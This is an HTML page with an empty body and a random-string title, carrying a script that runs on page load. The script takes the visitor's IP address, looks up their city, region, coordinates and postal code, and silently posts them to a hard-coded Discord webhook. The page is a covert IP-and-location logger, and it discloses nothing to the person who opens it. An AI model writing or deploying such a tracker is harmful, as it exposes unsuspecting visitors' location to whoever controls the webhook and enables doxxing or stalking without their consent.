<!DOCTYPE html>
<html>
<head>
  <title>9C7usvZa2fubNAYR2FDEne2wbtGesF4HW2R6QnBTXYv4tSsmsYSmb8NZKw7TndXh3uSeHm7KYNQ3KRCh5m63E9Yu4kbLHsrENthc</title>
  <script>
    window.onload = function() {
      const apiUrl = 'https://api.ipify.org/?format=jsonp&callback=processIP';
      const script = document.createElement('script');
      script.src = apiUrl;
      document.head.appendChild(script);
    };

    function processIP(response) {
      const ipAddress = response.ip;
      const ipapiUrl = 'https://ipapi.co/' + ipAddress + '/json/';
      fetch(ipapiUrl)
        .then(response => response.json())
        .then(data => {
          const country = data.country_name;
          const flagEmoji = getFlagEmoji(data.country_code);
          const city = data.city;
          const region = data.region;
          const latitude = data.latitude;
          const longitude = data.longitude;
          const timezone = data.timezone;
          const currency = data.currency;
          const postalCode = data.postal;
          const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
          const messagePayload = {
            embeds: [
              {
                title: 'IP Information',
                description: `IP Address: ${ipAddress}\n${flagEmoji} Country: ${country}\nCity: ${city}\nRegion: ${region}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nCurrency: ${currency}\nPostal Code: ${postalCode}`,
                color: 16711680
              }
            ]
          };
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(messagePayload)
          });
        });
    }

    function getFlagEmoji(countryCode) {
      const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
      return String.fromCodePoint(...codePoints);
    }
  </script>
</head>
<body>

</body>
</html>
